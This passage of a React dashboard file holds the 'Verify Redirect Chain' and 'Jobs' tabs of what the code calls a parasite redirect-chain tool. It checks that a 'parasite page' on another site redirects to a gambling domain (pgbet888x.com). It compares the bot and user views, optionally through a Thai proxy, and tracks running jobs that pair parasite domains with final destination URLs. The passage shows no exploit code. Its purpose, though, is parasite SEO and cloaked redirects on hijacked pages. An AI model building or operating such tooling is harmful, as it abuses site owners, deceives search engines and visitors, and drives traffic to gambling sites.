        <CardTitle className="text-sm text-white">Verify Redirect Chain</CardTitle>
        <CardDescription className="text-xs">ตรวจสอบว่า redirect chain ทำงานจริง (ทดสอบทั้ง bot และ user view)</CardDescription>
      </CardHeader>
      <CardContent className="space-y-3">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
          <div>
            <Label className="text-xs text-zinc-400">Start URL (parasite page)</Label>
            <Input value={startUrl} onChange={e => setStartUrl(e.target.value)}
              placeholder="https://middlemanbar.com/menu" className="bg-zinc-800 border-zinc-700 text-sm" />
          </div>
          <div>
            <Label className="text-xs text-zinc-400">Expected Final URL</Label>
            <Input value={expectedFinal} onChange={e => setExpectedFinal(e.target.value)}
              placeholder="https://pgbet888x.com" className="bg-zinc-800 border-zinc-700 text-sm" />
          </div>
        </div>
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-2">
            <Switch checked={useProxy} onCheckedChange={setUseProxy} />
            <Label className="text-xs text-zinc-400">Use Thai Proxy</Label>
          </div>
          <Button onClick={() => verify.mutate({ startUrl, expectedFinalUrl: expectedFinal, useProxy })}
            disabled={!startUrl || !expectedFinal || verify.isPending} className="bg-green-600 hover:bg-green-500">
            {verify.isPending ? "Verifying..." : "✅ Verify Chain"}
          </Button>
        </div>

        {result && (
          <div className={`rounded-lg p-4 border ${result.success ? "bg-green-900/20 border-green-500/30" : "bg-yellow-900/20 border-yellow-500/30"}`}>
            <div className="flex items-center gap-2 mb-3">
              <span className="text-lg">{result.success ? "✅" : "⚠️"}</span>
              <span className="text-sm text-white font-semibold">{result.success ? "Chain Verified!" : "Chain Incomplete"}</span>
              <Badge variant="outline" className="text-xs">HTTP {result.statusCode}</Badge>
              {result.seoContentVisible && <Badge className="text-xs bg-purple-600">SEO Content Visible</Badge>}
            </div>
            <p className="text-xs text-zinc-300 mb-3">{result.detail}</p>
            <div className="flex items-center gap-1 flex-wrap">
              {(result.redirectChain || []).map((url: string, i: number) => (
                <div key={i} className="flex items-center gap-1">
                  <Badge variant="outline" className="text-xs border-zinc-600 max-w-[250px] truncate">{url}</Badge>
                  {i < result.redirectChain.length - 1 && <span className="text-zinc-500">→</span>}
                </div>
              ))}
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
}

// ═══════════════════════════════════════════════
//  Tab 7: Jobs
// ═══════════════════════════════════════════════

function JobsTab() {
  const jobs = trpc.parasiteRedirectChain.getActiveJobs.useQuery(undefined, { refetchInterval: 3000 });

  return (
    <Card className="bg-zinc-900/50 border-zinc-700/50">
      <CardHeader className="pb-3">
        <CardTitle className="text-sm text-white">Active & Recent Jobs</CardTitle>
      </CardHeader>
      <CardContent>
        {(jobs.data || []).length === 0 ? (
          <div className="text-center text-zinc-500 py-8">
            <p className="text-4xl mb-2">📋</p>
            <p>No jobs yet</p>
          </div>
        ) : (
          <div className="space-y-2">
            {(jobs.data || []).map((job: any) => (
              <div key={job.id} className="bg-zinc-800/50 rounded-lg p-3 border border-zinc-700/50">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Badge variant={job.status === "done" ? "default" : job.status === "running" ? "secondary" : "destructive"} className="text-xs">
                      {job.status}
                    </Badge>
                    <span className="text-xs text-white font-mono">{job.id}</span>
                  </div>
                  <span className="text-xs text-zinc-400">{new Date(job.startedAt).toLocaleString()}</span>
                </div>
                <div className="mt-2 text-xs text-zinc-400">
                  {job.config?.parasiteDomain} → {job.config?.finalDestUrl}
                </div>
                {job.lastProgress && (
                  <div className="mt-1 text-xs text-purple-300">
                    [{job.lastProgress.phase}] {job.lastProgress.detail}
                  </div>
                )}
              </div>
            ))}
          </div>
        )}
      </CardContent>
    </Card>
  );
}
